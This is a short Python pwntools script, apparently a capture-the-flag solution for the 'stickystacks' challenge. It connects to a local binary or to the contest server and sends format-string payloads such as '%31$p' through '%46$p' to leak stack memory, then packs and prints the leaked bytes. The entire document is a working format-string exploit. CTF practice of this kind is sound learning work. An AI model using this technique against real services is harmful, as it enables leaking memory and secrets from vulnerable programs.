#!/usr/bin/env python3
from pwn import *

mem = b''

for i in range(0x10):
    if len(sys.argv) == 1:
        s = process('./stickystacks')
    else:
        s = remote('shell.actf.co', 21820)

    s.sendlineafter('Name: ', f'%{i+31}$p')
    s.recvuntil(', ')
    res = s.recvline(False)
    if res == b'(nil)':
        mem += p64(0)
    else:
        mem += p64(int(res, 0x10))
    s.close()
print(mem)

s.interactive()
